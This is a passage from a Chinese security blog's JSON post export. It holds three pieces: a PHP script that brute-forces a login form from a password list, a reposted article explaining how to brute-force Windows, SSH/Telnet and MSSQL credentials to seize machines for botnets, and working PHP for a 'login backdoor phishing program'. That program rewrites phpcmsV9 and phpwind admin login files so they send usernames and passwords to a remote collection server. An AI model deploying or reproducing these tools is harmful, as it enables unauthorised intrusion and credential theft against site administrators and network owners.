class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"preprocessor\">&lt;?php</span></div><div class=\"line\">set_time_limit(<span class=\"number\">0</span>);</div><div class=\"line\"><span class=\"variable\">$pwd</span> = <span class=\"string\">'password/pwdt.txt'</span>; <span class=\"comment\">//密码文件</span></div><div class=\"line\"><span class=\"variable\">$rhost</span> = <span class=\"string\">'http://127.0.0.1/test/test.php'</span>; <span class=\"comment\">//POST数据地址</span></div><div class=\"line\"><span class=\"variable\">$file</span> = fopen(<span class=\"variable\">$pwd</span>, <span class=\"string\">'r'</span>);<span class=\"comment\">//初始化文件句柄</span></div><div class=\"line\"><span class=\"variable\">$curl</span> = curl_init();<span class=\"comment\">//初始化</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">//设置参数</span></div><div class=\"line\"></div><div class=\"line\">curl_setopt(<span class=\"variable\">$curl</span>, CURLOPT_URL, <span class=\"variable\">$rhost</span>);<span class=\"comment\">//设置目标地址</span></div><div class=\"line\">curl_setopt(<span class=\"variable\">$curl</span>, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);<span class=\"comment\">//设置接收反馈内容</span></div><div class=\"line\">curl_setopt(<span class=\"variable\">$curl</span>, CURLOPT_HEADER, <span class=\"number\">0</span>);</div><div class=\"line\">curl_setopt(<span class=\"variable\">$curl</span>, CURLOPT_POST, <span class=\"number\">1</span>);<span class=\"comment\">//设置提交方式为POST</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">while</span> (!feof(<span class=\"variable\">$file</span>)){</div><div class=\"line\"></div><div class=\"line\"> <span class=\"variable\">$fpwd</span> = trim(fgets(<span class=\"variable\">$file</span>));</div><div class=\"line\"></div><div class=\"line\"> <span class=\"variable\">$post_data</span> = <span class=\"keyword\">array</span>(<span class=\"string\">'password'</span>=&gt;<span class=\"variable\">$fpwd</span>); <span class=\"comment\">//POST提交数据</span></div><div class=\"line\"> curl_setopt(<span class=\"variable\">$curl</span>, CURLOPT_POSTFIELDS, <span class=\"variable\">$post_data</span>);</div><div class=\"line\"> <span class=\"comment\">//执行提交内容</span></div><div class=\"line\"> curl_exec(<span class=\"variable\">$curl</span>);</div><div class=\"line\"> <span class=\"comment\">//获取状态反馈信息组</span></div><div class=\"line\"> <span class=\"variable\">$rsinfo</span> = curl_getinfo(<span class=\"variable\">$curl</span>);</div><div class=\"line\"> <span class=\"keyword\">if</span>(intval(<span class=\"variable\">$rsinfo</span>[<span class=\"string\">'http_code'</span>])== <span class=\"number\">302</span>){</div><div class=\"line\"> file_put_contents(<span class=\"string\">'pwd.txt'</span>, <span class=\"variable\">$fpwd</span>);</div><div class=\"line\"> <span class=\"keyword\">echo</span> <span class=\"string\">'密码是：'</span>.<span class=\"variable\">$fpwd</span>.<span class=\"string\">'已经保存到pwd.txt文件中'</span>;</div><div class=\"line\"> <span class=\"keyword\">return</span> ;</div><div class=\"line\"> }</div><div class=\"line\"></div><div class=\"line\">}</div><div class=\"line\"><span class=\"comment\">//关闭资源接口</span></div><div class=\"line\">curl_close(<span class=\"variable\">$curl</span>);</div><div class=\"line\"><span class=\"comment\">//关闭文件句柄释放资源</span></div><div class=\"line\">fclose(<span class=\"variable\">$file</span>);</div></pre></td></tr></table></figure>\n\n<h2>","_id":"pr3nkmpsoqejchsa","comments":true,"layout":"post","photos":[],"link":""},{"title":"渗透之密码破解","id":241,"date":1346953089000,"tags":[],"categories":["1bynalp69sca7b8g"],"content":"<p>本文转自：法客 作者：杀猪刀</p>\n<p>习惯了，睡觉去法客看看有没有好的文章看看，今天发现这个文章相当不错，所以转载之~~</p>\n<h1 id=\"一、系统密码破解篇：\">一、系统密码破解篇：</h1>\n<p>1） Windows系统密码破解</p>\n<p>说起系统密码，估计玩安全比较早的人都知道04-07年那一阵一个啊D工具包就能够扫出一大堆肉鸡，<br>但是对于牛逼的XX们来说这显然是不够用的，于是慢慢到后来就有了各种XX论坛、XX小组自动抓鸡工具，后来360的崛起，<br>免费的杀软如春笋般冒出才慢慢止住势头，那么对于Windows系统账号密码破解，工具很多，主流的有：<br>啊D网络工具包<br>NTScan<br>Windows系统密码破解的流程是：</p>\n<ol>\n<li>通过扫描端口确定对方开启了IPC$</li>\n<li>通过工具穷举密码直到正确的密码</li>\n<li>获得正确的密码后通过远程任务计划开启进程等（最原始最土的做法）很明显这种方法一般是作为菜鸟入门才使用的，记得当时分析自动抓鸡才发现，使用了WMIC管理规范，原来是一段WMIC脚本自动HTTP种植木马，到目前为止所谓自动化135抓鸡工具也是此原理和代码；</li>\n</ol>\n<p>近年来还流行一种所谓RDP远程破解抓肉鸡的方法，原理很简单模拟批量登入RDP协议（Remote Desktop Protocol），<br>很简单有过Windows管理经验的人都知道微软默认的管理方式就是RDP远程桌面管理，很明显如果可以模拟此行为大量提交那么也可以破解密码，<br>代表的工具就是俄罗斯黑客出品的public版工具以及XXX。其实还有一种方式不通过微软RDP端，自己重写RDP连接协议，效率更高。此类工具我就用过，嘿嘿。</p>\n<p>本地破解：<br>通过抓hash然后字典破解，这种方法适合已经获取系统权限可以抓密码文件的方式，所以叫做本地破解，<br>也许本人小时候帮助舅舅杀猪的时候按猪脚沾了血腥，导致这些年运气不好，成功率不到1/1000。</p>\n<p>总结：</p>\n<blockquote>\n<p>到目前为止，一些地下组织的所谓全端口抓鸡工具包也包含了Windows系统密码破解的，Windows 2000/xp/2003/vista/win7都通用，<br>如果各位有疑问可以扫你们当地网段肯定可以扫到包含弱口令的机器，如果运气好那就直接可以上传执行木马。当然对于我们搞Web安全来说，<br>经常遇到需要破解密码的情况无非是提权抓到了本地密码文件，然后爆破密码。还有就是日进了内网，扩展战果使用，都非常重要，而且屡试不爽。</p>\n</blockquote>\n<p>2） Linux/Unix系统密码破解：</p>\n<p>Linux/Unix目前主流的管理协议都是SSH/Telnet，常用的管理工具诸如：Putty、SecureCRT、SSHClient等，<br>目前因为Linux/Unix入门相对Windows较难，因此玩Linux/Unix的人比较少，相对的流行的工具、教程也少。<br>那么Linux/Unix可不可以像Windows那样批量扫肉鸡，当然是可以了。先说Telnet协议，大家都知道Telnet是明文协议，<br>也就是可以抓包获取登入密码，而一般的网络设备如交换机、路由器、防火墙默认基本上都是通过Telnet协议远程管理，<br>要破解Telnet协议密码也非常简单，工具很多比如X-Scan等，而SSH协议也类似，直接破解密码后使用工具也可以直接登入。<br>而且登入后直接执行命令，而不必像windows那样需要种植木马后门才能够交互执行。如果有想学习路由交换而缺少银子的朋友，<br>建议你操起X-Scan填入你们当地公网网段，破telnet/ssh你会发现大量的H3COM、中兴等你蹂躏。搞完考一个CCNA肯定没问题；<br>总结：Linux/Unix破解密码的先决条件是目标采用静态密码验证登入系统，如果采用的是RSA密钥的方式验证，那么这类基于远程密码破解自然就无意义了。<br>这也是与Windows区别比较大的地方。另外破解Linux/Unix密码也可以采用曲线救国的方式，那就是知道对方采用某一类管理工具比如VNC等X-Windows客户端软件。<br>这类工具很多都有自己的验证方式，如果爆发漏洞（比如之前的VNC弱口令），或者没有采用强壮的认证方式那么更加容易被远程暴力破解。<br>这种情况通常发生在有一定规模的企业，服务器达到一定的数量级为了便于管理通常都会使用某一类商用管理客户端。<br>当然，目的是密码，也可以剑走偏锋。比如今年爆发的汉化版客户端Putty、SecureCRT等被植入后门的事件也充分说明了广大“黑客”的智慧无上限。<br>代表工具：单一协议很多，这里推荐神器：Hydra以及NCrack。详见<a href=\"http://sectools.org/。\" target=\"_blank\" rel=\"external\">http://sectools.org/。</a></p>\n<h1 id=\"二、数据库密码篇：\">二、数据库密码篇：</h1>\n<p>主流的数据库很多，目前国内流行的基于破解密码的抓鸡方式最主流的就是1433抓鸡，之所以叫1433抓鸡是因为微软MSSQL Server数据库默认远程管理端口是1433（当然可以更改），<br>而默认情况下MSSQL Server最高权限用户sa绑定了shell，通俗的说就是如果你拥有了MSSQL Server 数据库Sa账户的权限那么你就拥有了系统执行权限。<br>所以随便谷歌1433抓鸡|1433批量抓鸡，工具教程一大把。利用的程序也就那么几个因为够代表性简述下大概流程：</p>\n<ol>\n<li>通过端口批量扫描确定开放1433的主机，一般这个扫描由S扫描器完成，也就是Wineggdrop大神的S扫描器，在此感谢他提供了互联网历史上公开最快的SYN扫描工具，没有之一。</li>\n<li>通过管理工具连接存在弱口令的主机，通常使用小榕写的MSSQL执行工具；</li>\n<li>如果发现没有权限那么导入一堆的恢复扩展命令，直到能恢复为止；</li>\n<li>确定能够执行的工具后上传木马，于是肉鸡到手；</li>\n</ol>\n<p>PS：这个是目前为止除了挂马来肉鸡最快的远程抓鸡方式，说到这里或许有人会问，Access数据库行不行，能不能破解弱口令抓肉鸡？<br>没意义，因为Access是非常小型本地数据库，适用于小应用，微软没有为其提供远程管理方式，所以就没远程破解密码的说法，<br>对于web安全而言更多的是通过注入、路径泄漏等方式获取Access数据库中的管理员密码然后登入后台获取Webshell，然后提权。<br>当然MSSQL数据库密码获取也可以剑走偏锋，比如获取Webshell之后通过翻看配置文件，<br>通常关于数据库信息容易存在于conn.asp、webconfig.xml等默认配置文件以及用户自行开发的配置文件中。<br>国内也有商用工具在做白盒测试扫描时会自动遍历此类文件然后做关键是识别匹配。</p>\n<p>说完MSSQL那就不不说跟他很像的MySQL数据库，这个数据库通常运行于Linux/Unix系统中。MYSQL与其功能强大、免费、高效著称。<br>很明显作为一款强大的数据库必须支持远程管理，那么自然就有破解密码这一说了，通常情况下纯粹远程破解MYSQL可以使用的工具很多比如国产的X-Scan、HScan等。<br>当然也可以通过爆破phpMyadmin这个管理平台来曲线救国达到爆破的目的，区别在于用HTTP通道爆破而已。以上为比较典型的远程破解，<br>而本地破解则显得比较单一，通过webshell或者提权之后获取user.MYD文件（此文件Linux与Windows都存放在相同目录）<br>然后找到Hash本地爆破或者使用网站在线爆破比如：<a href=\"http://www.onlinehashcrack.com/multi-hash-cracking.php。\" target=\"_blank\" rel=\"external\">http://www.onlinehashcrack.com/multi-hash-cracking.php。</a><br>当然了MYSQL同样可以使用查看网站配置文件的方式获取密码，比如各种CMS以及论坛，初次安装都需要写入数据库连接信息到某配置文件xx .inc.php等。<br>当然不管何种数据库都会有漏洞爆发的可能，导致验证被攻破，比如前一段时间爆发的MySQL身份认证漏洞。导致直接可以绕过认证。</p>\n<p>一篇不错的文章，所以收留之~</p>\n","source":"_posts/渗透之密码破解.md","raw":"title: \"渗透之密码破解\"\nid: 241\ndate: 2012-09-07 01:38:09\ntags: \ncategories: \n- 技术文章\n---\n\n本文转自：法客 作者：杀猪刀\n\n习惯了，睡觉去法客看看有没有好的文章看看，今天发现这个文章相当不错，所以转载之~~\n\n\n一、系统密码破解篇：\n==\n1） Windows系统密码破解\n\n说起系统密码，估计玩安全比较早的人都知道04-07年那一阵一个啊D工具包就能够扫出一大堆肉鸡，\n但是对于牛逼的XX们来说这显然是不够用的，于是慢慢到后来就有了各种XX论坛、XX小组自动抓鸡工具，后来360的崛起，\n免费的杀软如春笋般冒出才慢慢止住势头，那么对于Windows系统账号密码破解，工具很多，主流的有：\n啊D网络工具包\nNTScan\nWindows系统密码破解的流程是：\n\n1. 通过扫描端口确定对方开启了IPC$\n2. 通过工具穷举密码直到正确的密码\n3. 获得正确的密码后通过远程任务计划开启进程等（最原始最土的做法）很明显这种方法一般是作为菜鸟入门才使用的，记得当时分析自动抓鸡才发现，使用了WMIC管理规范，原来是一段WMIC脚本自动HTTP种植木马，到目前为止所谓自动化135抓鸡工具也是此原理和代码；\n\n近年来还流行一种所谓RDP远程破解抓肉鸡的方法，原理很简单模拟批量登入RDP协议（Remote Desktop Protocol），\n很简单有过Windows管理经验的人都知道微软默认的管理方式就是RDP远程桌面管理，很明显如果可以模拟此行为大量提交那么也可以破解密码，\n代表的工具就是俄罗斯黑客出品的public版工具以及XXX。其实还有一种方式不通过微软RDP端，自己重写RDP连接协议，效率更高。此类工具我就用过，嘿嘿。\n\n本地破解：\n通过抓hash然后字典破解，这种方法适合已经获取系统权限可以抓密码文件的方式，所以叫做本地破解，\n也许本人小时候帮助舅舅杀猪的时候按猪脚沾了血腥，导致这些年运气不好，成功率不到1/1000。\n\n总结：\n>到目前为止，一些地下组织的所谓全端口抓鸡工具包也包含了Windows系统密码破解的，Windows 2000/xp/2003/vista/win7都通用，\n如果各位有疑问可以扫你们当地网段肯定可以扫到包含弱口令的机器，如果运气好那就直接可以上传执行木马。当然对于我们搞Web安全来说，\n经常遇到需要破解密码的情况无非是提权抓到了本地密码文件，然后爆破密码。还有就是日进了内网，扩展战果使用，都非常重要，而且屡试不爽。\n\n2） Linux/Unix系统密码破解：\n\nLinux/Unix目前主流的管理协议都是SSH/Telnet，常用的管理工具诸如：Putty、SecureCRT、SSHClient等，\n目前因为Linux/Unix入门相对Windows较难，因此玩Linux/Unix的人比较少，相对的流行的工具、教程也少。\n那么Linux/Unix可不可以像Windows那样批量扫肉鸡，当然是可以了。先说Telnet协议，大家都知道Telnet是明文协议，\n也就是可以抓包获取登入密码，而一般的网络设备如交换机、路由器、防火墙默认基本上都是通过Telnet协议远程管理，\n要破解Telnet协议密码也非常简单，工具很多比如X-Scan等，而SSH协议也类似，直接破解密码后使用工具也可以直接登入。\n而且登入后直接执行命令，而不必像windows那样需要种植木马后门才能够交互执行。如果有想学习路由交换而缺少银子的朋友，\n建议你操起X-Scan填入你们当地公网网段，破telnet/ssh你会发现大量的H3COM、中兴等你蹂躏。搞完考一个CCNA肯定没问题；\n总结：Linux/Unix破解密码的先决条件是目标采用静态密码验证登入系统，如果采用的是RSA密钥的方式验证，那么这类基于远程密码破解自然就无意义了。\n这也是与Windows区别比较大的地方。另外破解Linux/Unix密码也可以采用曲线救国的方式，那就是知道对方采用某一类管理工具比如VNC等X-Windows客户端软件。\n这类工具很多都有自己的验证方式，如果爆发漏洞（比如之前的VNC弱口令），或者没有采用强壮的认证方式那么更加容易被远程暴力破解。\n这种情况通常发生在有一定规模的企业，服务器达到一定的数量级为了便于管理通常都会使用某一类商用管理客户端。\n当然，目的是密码，也可以剑走偏锋。比如今年爆发的汉化版客户端Putty、SecureCRT等被植入后门的事件也充分说明了广大“黑客”的智慧无上限。\n代表工具：单一协议很多，这里推荐神器：Hydra以及NCrack。详见http://sectools.org/。\n\n二、数据库密码篇：\n==\n\n主流的数据库很多，目前国内流行的基于破解密码的抓鸡方式最主流的就是1433抓鸡，之所以叫1433抓鸡是因为微软MSSQL Server数据库默认远程管理端口是1433（当然可以更改），\n而默认情况下MSSQL Server最高权限用户sa绑定了shell，通俗的说就是如果你拥有了MSSQL Server 数据库Sa账户的权限那么你就拥有了系统执行权限。\n所以随便谷歌1433抓鸡|1433批量抓鸡，工具教程一大把。利用的程序也就那么几个因为够代表性简述下大概流程：\n\n1. 通过端口批量扫描确定开放1433的主机，一般这个扫描由S扫描器完成，也就是Wineggdrop大神的S扫描器，在此感谢他提供了互联网历史上公开最快的SYN扫描工具，没有之一。\n2. 通过管理工具连接存在弱口令的主机，通常使用小榕写的MSSQL执行工具；\n3. 如果发现没有权限那么导入一堆的恢复扩展命令，直到能恢复为止；\n4. 确定能够执行的工具后上传木马，于是肉鸡到手；\n\nPS：这个是目前为止除了挂马来肉鸡最快的远程抓鸡方式，说到这里或许有人会问，Access数据库行不行，能不能破解弱口令抓肉鸡？\n没意义，因为Access是非常小型本地数据库，适用于小应用，微软没有为其提供远程管理方式，所以就没远程破解密码的说法，\n对于web安全而言更多的是通过注入、路径泄漏等方式获取Access数据库中的管理员密码然后登入后台获取Webshell，然后提权。\n当然MSSQL数据库密码获取也可以剑走偏锋，比如获取Webshell之后通过翻看配置文件，\n通常关于数据库信息容易存在于conn.asp、webconfig.xml等默认配置文件以及用户自行开发的配置文件中。\n国内也有商用工具在做白盒测试扫描时会自动遍历此类文件然后做关键是识别匹配。\n\n说完MSSQL那就不不说跟他很像的MySQL数据库，这个数据库通常运行于Linux/Unix系统中。MYSQL与其功能强大、免费、高效著称。\n很明显作为一款强大的数据库必须支持远程管理，那么自然就有破解密码这一说了，通常情况下纯粹远程破解MYSQL可以使用的工具很多比如国产的X-Scan、HScan等。\n当然也可以通过爆破phpMyadmin这个管理平台来曲线救国达到爆破的目的，区别在于用HTTP通道爆破而已。以上为比较典型的远程破解，\n而本地破解则显得比较单一，通过webshell或者提权之后获取user.MYD文件（此文件Linux与Windows都存放在相同目录）\n然后找到Hash本地爆破或者使用网站在线爆破比如：http://www.onlinehashcrack.com/multi-hash-cracking.php。\n当然了MYSQL同样可以使用查看网站配置文件的方式获取密码，比如各种CMS以及论坛，初次安装都需要写入数据库连接信息到某配置文件xx .inc.php等。\n当然不管何种数据库都会有漏洞爆发的可能，导致验证被攻破，比如前一段时间爆发的MySQL身份认证漏洞。导致直接可以绕过认证。\n\n一篇不错的文章，所以收留之~\n","slug":"渗透之密码破解","updated":1421659126000,"excerpt":"","_id":"3q3n0burmmqt7uy0","comments":true,"layout":"post","photos":[],"link":""},{"title":"登录后门钓鱼程序 V1.0","id":99,"date":1341250335000,"tags":["2191ch4on5ok5nco","1bxs8elni36scx8x"],"categories":["ng1ki7p1v08zbwrz","3ew512opa4s8w18i"],"content":"<p>现在的各大cms也好bbs也好。对于用户的加密方式已经不仅仅局限于md5(密码)了。大家都知道一次md5加密的密码，</p>\n<p>如果系统一旦有注入漏洞被获取到加密后的密码通过一些付费或者免费的网站是完全可以破解密码的，而现在那些主流</p>\n<p>cms或者bbs加密方式越来月多样化了，导致即使拿到管理员数据库中的加密密码也没用了，所有就有了这个程序。</p>\n<p>先上代码：</p>\n<p>程序端:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"preprocessor\">&lt;?php</span></div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> +-----------------------------------------------------------------</div><div class=\"line\"> * 登录后门钓鱼程序 V1.0</div><div class=\"line\"> +-----------------------------------------------------------------</div><div class=\"line\"> * 功能介绍：</div><div class=\"line\"> * 本程序会根据所选cms和BBS系统自动插入钓鱼后门</div><div class=\"line\"> * 后续将完善支持PHP的主流的cms和bbs系统</div><div class=\"line\"> * 本程序仅供学习参考，请勿非法用途 ，请保留版权信息</div><div class=\"line\"> +-----------------------------------------------------------------</div><div class=\"line\"> * 作者： Return Blogs: www.creturn.com</div><div class=\"line\"> +-----------------------------------------------------------------</div><div class=\"line\"> **/</div><div class=\"line\">error_reporting(<span class=\"number\">0</span>);</div><div class=\"line\"><span class=\"variable\">$rHost</span> = <span class=\"string\">'http://192.168.1.199/MyProject/server/sever.php'</span>; <span class=\"comment\">//定义接收地址</span></div><div class=\"line\"><span class=\"variable\">$pUname</span> = <span class=\"string\">'uname'</span>; <span class=\"comment\">//远程端接收用户名参数</span></div><div class=\"line\"><span class=\"variable\">$pPwd</span> = <span class=\"string\">'pwd'</span>; <span class=\"comment\">//定义远程接收密码参数</span></div><div class=\"line\"><span class=\"variable\">$error</span> = <span class=\"string\">''</span>;</div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> * 插入代码</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">inSertPwdDoor</span><span class=\"params\">(<span class=\"variable\">$cmsCode</span>,<span class=\"variable\">$relPath</span>)</span></span>{</div><div class=\"line\"> <span class=\"keyword\">global</span> <span class=\"variable\">$rHost</span>,<span class=\"variable\">$pUname</span>,<span class=\"variable\">$pPwd</span>;</div><div class=\"line\"> <span class=\"comment\">//读取用户名密码特制</span></div><div class=\"line\"> <span class=\"keyword\">if</span>(<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'mothed'</span>] == <span class=\"string\">'post'</span>){</div><div class=\"line\"> <span class=\"variable\">$rHostPath</span> = <span class=\"variable\">$rHost</span>.<span class=\"string\">'?'</span>.<span class=\"variable\">$pUname</span>.<span class=\"string\">'=$_POST['</span>.<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'uname'</span>].<span class=\"string\">']&amp;'</span>.<span class=\"variable\">$pPwd</span>.<span class=\"string\">'=$_POST['</span>.<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'pwd'</span>].<span class=\"string\">']'</span>;</div><div class=\"line\"> }<span class=\"keyword\">else</span>{</div><div class=\"line\"> <span class=\"variable\">$rHostPath</span> = <span class=\"variable\">$rHost</span>.<span class=\"string\">'?'</span>.<span class=\"variable\">$pUname</span>.<span class=\"string\">'=$_GET['</span>.<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'uname'</span>].<span class=\"string\">']&amp;'</span>.<span class=\"variable\">$pPwd</span>.<span class=\"string\">'=$_GET['</span>.<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'pwd'</span>].<span class=\"string\">']'</span>;</div><div class=\"line\"> }</div><div class=\"line\"> <span class=\"comment\">//获取插入代码</span></div><div class=\"line\"> <span class=\"variable\">$keyword</span> = <span class=\"variable\">$cmsCode</span>[<span class=\"string\">'keyword'</span>];</div><div class=\"line\"> <span class=\"variable\">$replace</span> = <span class=\"string\">'file_get_contents(&quot;'</span>.<span class=\"variable\">$rHostPath</span>.<span class=\"string\">'&quot;);'</span>.<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'bedeck'</span>].<span class=\"variable\">$keyword</span>;</div><div class=\"line\"> <span class=\"variable\">$loginPageContent</span> = file_get_contents(<span class=\"variable\">$relPath</span>);</div><div class=\"line\"> <span class=\"variable\">$loginPageContent</span> = str_replace(<span class=\"variable\">$keyword</span>, <span class=\"variable\">$replace</span>, <span class=\"variable\">$loginPageContent</span>);</div><div class=\"line\"> <span class=\"keyword\">if</span>(file_put_contents(<span class=\"variable\">$relPath</span>, <span class=\"variable\">$loginPageContent</span>)){</div><div class=\"line\"> tipAmessage(<span class=\"string\">'成功插入！'</span>);</div><div class=\"line\"> }<span class=\"keyword\">else</span>{</div><div class=\"line\"> tipAmessage(<span class=\"string\">'插入失败！'</span>);</div><div class=\"line\"> }</div><div class=\"line\">}</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">tipAmessage</span><span class=\"params\">(<span class=\"variable\">$msg</span>)</span></span>{</div><div class=\"line\"> <span class=\"keyword\">global</span> <span class=\"variable\">$error</span>;</div><div class=\"line\"> <span class=\"variable\">$error</span> = <span class=\"variable\">$msg</span>;</div><div class=\"line\">}</div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> * 各类cms登录标识码和文件路径</div><div class=\"line\"> *</div><div class=\"line\"> * $code说明：</div><div class=\"line\"> * $code['keyword'] 关键字，就是要插入代码的特征码</div><div class=\"line\"> * $code['bedeck'] 修饰符用来修正代码的外观</div><div class=\"line\"> * $code['uname'] 用户名变量名</div><div class=\"line\"> * $code['pwd'] 密码变量名</div><div class=\"line\"> * $code['mothed'] 密码提交方式：POST 或者 GET</div><div class=\"line\"> * $code['path'] 登录文件路径</div><div class=\"line\"> * 注意事项：</div><div class=\"line\"> * 由于登录口不同程序可能有多个登录方法，正常登录</div><div class=\"line\"> * 或者ajax或者第三方登录，所以登录点的关键词必须找准</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">switchCms</span><span class=\"params\">(<span class=\"variable\">$cmsName</span>)</span></span>{</div><div class=\"line\"> <span class=\"variable\">$code</span> = <span class=\"keyword\">array</span>();</div><div class=\"line\"> <span class=\"keyword\">switch</span> (<span class=\"variable\">$cmsName</span>) {</div><div class=\"line\"> <span class=\"keyword\">case</span> <span class=\"string\">'phpcmsV9'</span>:</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'path'</span>] = <span class=\"string\">'phpcms/modules/admin/index.php'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'keyword'</span>] = &quot;showmessage(L(<span class=\"string\">'login_success'</span>),<span class=\"string\">'?m=admin&amp;c=index'</span>);&quot;;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'bedeck'</span>] = &quot;nttt&quot;;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'uname'</span>] = <span class=\"string\">'username'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'pwd'</span>] = <span class=\"string\">'password'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'mothed'</span>] = <span class=\"string\">'post'</span>;</div><div class=\"line\"> <span class=\"keyword\">break</span>;</div><div class=\"line\"> <span class=\"keyword\">case</span> <span class=\"string\">'phpwind'</span>:</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'path'</span>] = <span class=\"string\">'admin/admincp.php'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'keyword'</span>] = &quot;<span class=\"variable\">$REQUEST_URI</span> = trim(<span class=\"variable\">$REQUEST_URI</span>,<span class=\"string\">'?#'</span>);&quot;;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'bedeck'</span>] = &quot;nt&quot;;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'uname'</span>] = <span class=\"string\">'admin_name'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'pwd'</span>] = <span class=\"string\">'admin_pwd'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'mothed'</span>] = <span class=\"string\">'post'</span>;</div><div class=\"line\"> <span class=\"keyword\">break</span>;</div><div class=\"line\"> }</div><div class=\"line\"> <span class=\"keyword\">return</span> <span class=\"variable\">$code</span>;</div><div class=\"line\"></div><div class=\"line\">}</div><div class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'creack'</span>]) &amp;&amp; <span class=\"variable\">$_POST</span>[<span class=\"string\">'creack'</span>] != <span 